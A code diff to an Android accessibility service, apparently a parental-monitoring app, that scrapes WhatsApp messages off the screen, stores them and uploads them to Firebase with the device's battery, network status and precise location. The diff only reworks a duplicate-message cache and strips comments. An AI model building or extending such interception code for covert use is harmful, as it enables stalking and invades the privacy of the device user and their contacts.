@@ -20,8 +20,8 @@ import com.device.guardian.service.service.extractor.MessageExtractor
 import com.device.guardian.service.service.filter.MessageFilter
 import kotlinx.coroutines.*
 import kotlinx.coroutines.tasks.await
-import java.util.Collections
 import java.util.UUID
+import java.util.concurrent.ConcurrentHashMap
 
 @Suppress("DEPRECATION")
 class GuardianAccessibilityService : AccessibilityService() {
@@ -32,9 +32,9 @@ class GuardianAccessibilityService : AccessibilityService() {
     private val extractor = MessageExtractor()
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
-    // Thread-safe dedup cache
-    private val dedupCache = Collections.synchronizedSet(LinkedHashSet<String>())
-    private val DEDUP_MAX = 150
+    // BUG-20 fix: Time-based dedup cache with expiry
+    private val dedupCache = ConcurrentHashMap<String, Long>()
+    private val DEDUP_MAX = 200
     private val DEDUP_WINDOW_MS = 600_000L // 10 minutes
 
     companion object {
@@ -48,7 +48,6 @@ class GuardianAccessibilityService : AccessibilityService() {
         db = AppDatabase.getInstance(this)
         firebaseRepo = FirebaseRepository(db.messageDao(), this)
 
-        // Configure service info programmatically as extra layer
         serviceInfo = serviceInfo.apply {
             eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                          AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
@@ -60,6 +59,7 @@ class GuardianAccessibilityService : AccessibilityService() {
         startPeriodicSync()
         startCleanupWorker()
         startStatusSync()
+        startDedupCacheCleanup()
 
         Log.d(TAG, "Service connected")
     }
@@ -70,13 +70,11 @@ class GuardianAccessibilityService : AccessibilityService() {
         val pkg = event.packageName?.toString() ?: return
         if (!pkg.startsWith("com.whatsapp")) return
 
-        // Only process content change events
         if (event.eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
             event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
 
         val root = rootInActiveWindow ?: return
 
-        // FIX: Extract synchronously on the main thread (prevents AccessibilityNodeInfo recycling crashes)
         val extracted = try {
             extractor.extract(root)
         } catch (e: Exception) {
@@ -90,8 +88,6 @@ class GuardianAccessibilityService : AccessibilityService() {
 
         scope.launch {
             extracted.forEachIndexed { index, rawMessage ->
-                // Use the parsed timestamp from the sibling text if available,
-                // and add a minor micro-offset (10ms * index) to preserve screen sequence in DB index order.
                 val baseTime = if (rawMessage.timestamp > 0L) rawMessage.timestamp else System.currentTimeMillis()
                 val adjustedTimestamp = baseTime + index * 10L
                 processMessage(rawMessage, adjustedTimestamp)
@@ -100,11 +96,18 @@ class GuardianAccessibilityService : AccessibilityService() {
     }
 
     private suspend fun processMessage(raw: MessageExtractor.RawMessage, timestamp: Long) {
-        // Step 1 — in-memory dedup
+        val now = System.currentTimeMillis()
+
+        // Step 1 — in-memory dedup with time-based expiry (BUG-20 fix)
         val cacheKey = "${raw.chatName}::${raw.content}::${raw.sender}"
-        synchronized(dedupCache) {
-            if (!dedupCache.add(cacheKey)) return
-            if (dedupCache.size >= DEDUP_MAX) dedupCache.remove(dedupCache.iterator().next())
+        val lastSeen = dedupCache[cacheKey]
+        if (lastSeen != null && (now - lastSeen) < DEDUP_WINDOW_MS) return
+        dedupCache[cacheKey] = now
+
+        // Evict oldest entries if cache is too large
+        if (dedupCache.size > DEDUP_MAX) {
+            val cutoff = now - DEDUP_WINDOW_MS
+            dedupCache.entries.removeIf { it.value < cutoff }
         }
 
         // Step 2 — DB-level dedup (10 minute window)
@@ -130,7 +133,7 @@ class GuardianAccessibilityService : AccessibilityService() {
         )
         db.messageDao().insert(entity)
         
-        // Sync to Firebase immediately so parent sees data in real-time
+        // Sync to Firebase immediately
         try {
             firebaseRepo.syncPending()
         } catch (e: Exception) {
@@ -138,7 +141,6 @@ class GuardianAccessibilityService : AccessibilityService() {
         }
     }
 
-    // Periodic sync — catches anything that failed immediate sync
     private fun startPeriodicSync() {
         scope.launch {
             while (isActive) {
@@ -152,7 +154,6 @@ class GuardianAccessibilityService : AccessibilityService() {
         }
     }
 
-    // Run status sync periodically (every 1 minute)
     private fun startStatusSync() {
         scope.launch {
             while (isActive) {
@@ -161,13 +162,23 @@ class GuardianAccessibilityService : AccessibilityService() {
                 } catch (e: Exception) {
                     Log.w(TAG, "Status sync error: ${e.message}")
                 }
-                delay(60_000L) // 1 minute
+                delay(60_000L)
+            }
+        }
+    }
+
+    // BUG-20 fix: Periodically clean expired entries from dedup cache
+    private fun startDedupCacheCleanup() {
+        scope.launch {
+            while (isActive) {
+                delay(DEDUP_WINDOW_MS)
+                val cutoff = System.currentTimeMillis() - DEDUP_WINDOW_MS
+                dedupCache.entries.removeIf { it.value < cutoff }
             }
         }
     }
 
     private suspend fun syncStatusNow() {
-        // 1. Battery status
         val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
         val batteryStatus = registerReceiver(null, batteryFilter)
         val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
@@ -175,13 +186,11 @@ class GuardianAccessibilityService : AccessibilityService() {
         val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
         val isCharging = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING
 
-        // 2. Connectivity
         val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         val network = cm.activeNetwork
         val caps = network?.let { cm.getNetworkCapabilities(it) }
         val isOnline = caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
 
-        // 3. Location coordinates (High Accuracy via Play Services)
         var lat: Double? = null
         var lon: Double? = null
         try {
@@ -202,14 +211,12 @@ class GuardianAccessibilityService : AccessibilityService() {
         firebaseRepo.syncDeviceStatus(batteryPct, isCharging, isOnline, lat, lon)
     }
 
-    // Delete messages older than 30 days to save local storage
     private fun startCleanupWorker() {
         scope.launch {
-            // Run immediately on startup, then daily
             while (isActive) {
                 val cutoff = System.currentTimeMillis() - (30L * 24 * 60 * 60 * 1000L)
                 db.messageDao().deleteOlderThan(cutoff)
-                delay(24 * 60 * 60 * 1000L) // daily
+                delay(24 * 60 * 60 * 1000L)
             }
         }
     }
